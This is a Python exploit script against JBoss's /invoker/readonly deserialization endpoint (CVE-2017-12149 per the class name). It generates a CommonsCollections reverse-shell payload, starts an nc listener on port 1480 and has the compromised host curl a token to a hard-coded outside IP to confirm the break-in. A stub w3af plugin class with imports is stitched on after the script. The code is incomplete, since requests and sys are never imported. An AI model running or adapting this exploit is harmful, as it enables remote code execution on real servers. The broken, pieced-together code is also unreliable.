import random
import time
import os
import socket
import threading

def gen_token():
	a =''
	for i in range(32):
		a += str(random.randint(0,9))
	return a

def gen_payload(ip):
	cmd = 'java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap ' +ip+':1480'
	os.system(cmd)

def create_listener(token):
	cmd = 'echo \'curl -d "token='+ token +'" http://45.76.183.229/testwls/\' | nc -l -vv -p 1480'
	os.system(cmd)

def kill_process():
	cmd = "ps aux | grep 'nc -l -vv -p 1480' | grep -v grep | awk '{print $2}' | xargs kill"
	os.system(cmd)

def exploit(url):
	url = url +'/invoker/readonly'
	payload = open('./payload','rb')
	try:
		requests.post(url, data=payload, timeout=10)
	except Exception:
		return
	time.sleep(3)

def main():
	if len(sys.argv) < 3:
		sys.exit()
	remote_ip = sys.argv[1]
	url = sys.argv[2]
	gen_payload(remote_ip)
	token = gen_token()
	t = threading.Thread(target=create_listener,args=(token,))
	t.start()
	exploit(url)
	time.sleep(3)
	dectect_part = requests.get("http://45.76.183.229/testwls/list_url_exploited")
	if dectect_part.text == token:
		print "Executed, url: " + url
	else:
		print "Can't"

if __name__ =='__main__':
	main()
	kill_process()

from w3af.core.controllers.plugins.infrastructure_plugin import InfrastructurePlugin
from w3af.core.data.request.fuzzable_http_request import FuzzableHTTPRequest
from w3af.core.data.bloomfilter.scalable_bloom import ScalableBloomFilter
from w3af.core.data.dc.headers import Headers
import w3af.core.controllers.output_manager as om

import re, random, string


class cve_2017_12149(InfrastructurePlugin):
	pass